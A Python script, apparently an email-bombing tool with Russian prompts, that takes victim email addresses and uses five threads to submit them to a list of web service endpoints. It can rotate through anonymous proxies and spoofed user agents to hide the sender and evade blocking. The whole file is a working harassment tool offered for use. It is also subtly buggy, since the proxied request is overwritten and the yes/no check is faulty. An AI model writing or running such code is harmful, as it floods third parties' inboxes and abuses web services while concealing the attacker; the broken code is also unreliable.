# Imports:

from sys import argv
from random import choice
from threading import Thread
from urllib import request

import proxyscanio as proxieser
from servises import SERVS

from fake_useragent import UserAgent  # pip install fake_useragent

##


class EBomb:
    def __init__(self):
        self.Emails = self.Get_Emails()
        self.WPx = self.With_Proxies()
        self.Make_Threads()


    def Make_Threads(self):
        for _ in range(5):
            Thread(target=self.Send_Email).start()
    

    def Send_Email(self):
        if self.WPx:
            pp = proxieser.api(ret_format=tuple)
            pp.get_url(level="elite", protocol="http,https")
            proxies = pp.get_proxies()
        ua = UserAgent()
        header = {"User-Agent": ua.random}

        for serv in SERVS:
            for email in self.Emails:
                proxyT = ""
                if self.WPx:
                    type_ = serv[:len("https")].replace(":", "")
                    req = request.Request(serv %(email), headers=header,)
                    try:
                        proxy = choice(proxies)
                    except Exception as Error:
                        print(Error)
                        quit(1)
                    req.set_proxy(proxy, type_)
                    proxyT = f"С IP: {proxy}"
                
                try:
                    req = request.Request(serv %(email), headers=header)
                    resp = request.urlopen(req)
                    res = resp.status
                except Exception as Error:
                    res = Error
                print(f"На {email} {proxyT} | От {serv} | {res}")

    def With_Proxies(self):
        Use = input("Использовать прокси? [Д/н] ")
        return self.Y_n(Use)


    def Y_n(self, Use):
        Use = str(Use).lower()
        Terms = all(
            (
                any(
                    (
                        "y" in Use,
                        "yes" in Use,

                        "д" in Use,
                        "да" in Use,

                    )

                ),

                any(
                    (
                        "n" not in Use,
                        "no" not in Use,

                        "н" not in Use,
                        "нет" not in Use,

                    )
                )
            )
        )
        return Terms


    def Get_Emails(self):
        Entry = input("Введите почты (Через пробелы): ").split()
        return Entry

EBomb()